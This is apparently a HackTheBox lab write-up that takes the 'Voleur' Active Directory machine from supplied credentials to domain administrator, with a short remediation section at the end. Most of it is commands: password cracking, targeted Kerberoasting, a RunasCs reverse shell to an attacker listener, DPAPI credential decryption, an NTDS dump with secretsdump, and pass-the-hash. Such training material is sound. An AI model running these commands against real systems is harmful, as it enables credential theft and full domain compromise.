# HackTheBox - Voleur Writeup

**Machine:** Voleur  
**IP Address:** 10.129.71.253  
**Difficulty:** Medium
**OS:** Windows (Active Directory)

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Domain/Hosts: `dc.voleur.htb`, `VOLEUR.HTB`

### Provided Credentials

- `ryan.naylor / HollowOct31Nyt`

### Kerberos Setup

```ini
[realms]
  VOLEUR.HTB = {
    kdc = 10.129.71.253
    admin_server = 10.129.71.253
    default_domain = voleur.htb
  }
```

---

## Initial Access

### SMB and Access Review

Generated TGT and listed shares:

```bash
netexec smb DC.VOLEUR.HTB -u ryan.naylor -p 'HollowOct31Nyt' -k --generate-tgt ryan.naylor
export KRB5CCNAME=ryan.naylor.ccache
klist
netexec smb DC.VOLEUR.HTB -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

Downloaded `Access_Review.xlsx` from `IT/First-Line Support`:

```bash
KRB5CCNAME=ryan.naylor.ccache smbclient.py -k DC.VOLEUR.HTB
use IT
cd First-Line Support
get Access_Review.xlsx
```

Cracked document password:

```bash
office2john Access_Review.xlsx >> hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password: `football1`

Decrypted with msoffcrypto:

```bash
python3 -m venv venv
source venv/bin/activate
pip install msoffcrypto-tool
python3 -m msoffcrypto -p football1 Access_Review.xlsx entschluesselt_Access_Review.xlsx
```

Recovered service credentials:

- `svc_ldap / M1XyC9pW7qT5Vn`
- `svc_iis / N5pXyV1WqM7CZ8`

Hint for deleted user:

- `todd.wolfe / NightT1meP1dg3on14`

---

## Privilege Escalation - User

### BloodHound and Kerberoast

```bash
bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.129.71.253 --zip -k
```

Findings:

- `svc_ldap` has `GenericWrite` on `lacey.miller` and `WriteSPN` on `svc_winrm`.

Targeted Kerberoast:

```bash
netexec smb DC.VOLEUR.HTB -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --generate-tgt svc_ldap
export KRB5CCNAME=svc_ldap.ccache

targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_kerberos.txt
```

Cracked `svc_winrm`:

- `svc_winrm / AFireInsidedeOzarctica980219afi`

WinRM and user flag:

```bash
netexec smb DC.VOLEUR.HTB -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k --generate-tgt svc_winrm
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB

type C:\Users\svc_winrm\Desktop\user.txt
```

### Restore Deleted User (todd.wolfe)

Used RunasCs to obtain a shell as `svc_ldap`:

```cmd
mkdir C:\tools
cd C:\tools
upload RunasCs.exe
nc -lvnp 4444
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.16.xx:4444
```

Restored deleted user object:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
net user /domain
```

---

## Privilege Escalation - Root

### DPAPI and Third-Line Access

Kerberos access as Todd:

```bash
netexec smb DC.VOLEUR.HTB -u todd.wolfe -p 'NightT1meP1dg3on14' -k --generate-tgt todd.wolfe
export KRB5CCNAME=todd.wolfe.ccache
KRB5CCNAME=todd.wolfe.ccache smbclient.py -k DC.VOLEUR.HTB
```

Downloaded DPAPI files:

```bash
mget /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
mget /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```

Decrypted masterkey and credentials:

```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Recovered:

- `jeremy.combs / qT3V9pLXyN7W4m`

Kerberos as Jeremy, downloaded key and note from Third-Line Support:

```bash
netexec smb DC.VOLEUR.HTB -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k --generate-tgt jeremy.combs
export KRB5CCNAME=jeremy.combs.ccache
KRB5CCNAME=jeremy.combs.ccache smbclient.py -k DC.VOLEUR.HTB
mget /Third-Line Support/id_rsa
mget /Third-Line Support/Note.txt.txt
```

### SSH via WSL and Backup Extraction

```bash
chmod 600 id_rsa
ssh svc_backup@voleur.htb -p 2222 -i id_rsa
ls '/mnt/c/IT/Third-Line Support/Backups/Active Directory'
ls '/mnt/c/IT/Third-Line Support/Backups/registry'
```

Copied NTDS and SYSTEM:

```bash
scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* ./
scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* ./
```

Dumped hashes and authenticated as Administrator:

```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
getTGT.py -hashes :e656e07c56d831611bxxxxxb259ad2 -dc-ip 10.129.71.253 voleur.htb/administrator
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB
```

Root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. Password-protected documents can leak service account credentials.
2. Kerberoast enabled pivot to WinRM access.
3. Restoring deleted AD users can open new access paths.
4. DPAPI secrets and archived profiles can leak credentials.
5. NTDS backups provide full domain compromise.

---

## Tools Used

- netexec
- smbclient.py
- office2john / john
- msoffcrypto-tool
- bloodhound-python
- targetedKerberoast.py
- RunasCs
- dpapi.py
- secretsdump.py
- evil-winrm

---

## Flags

**User Flag:** `C:\Users\svc_winrm\Desktop\user.txt` (value not recorded in PDF)  
**Root Flag:** `C:\Users\Administrator\Desktop\root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Secure Service Account Credentials**

   - **Issue:** Credentials stored in Access_Review.xlsx.
   - **Impact:** Lateral movement via service accounts.
   - **Remediation:**
     - Remove passwords from documents and rotate exposed creds.

2. **Protect AD Backups**

   - **Issue:** NTDS and SYSTEM backups accessible via WSL/SMB.
   - **Impact:** Full domain compromise.
   - **Remediation:**
     - Restrict access to backup directories and encrypt at rest.

### High Severity

3. **Reduce Kerberoast Exposure**

   - **Issue:** `WriteSPN` allowed targeted Kerberoast.
   - **Impact:** Credential compromise for svc_winrm.
   - **Remediation:**
     - Remove unnecessary SPN write permissions.

4. **Limit DPAPI Credential Access**

   - **Issue:** Archived profiles leaked DPAPI secrets.
   - **Impact:** Credential recovery and escalation.
   - **Remediation:**
     - Secure archived user data and enforce strict ACLs.

### Medium Severity

5. **Restrict AD Object Restore Rights**

   - **Issue:** svc_ldap could restore deleted user objects.
   - **Impact:** Re-enabled privileged accounts.
   - **Remediation:**
     - Restrict Restore permissions and audit restores.
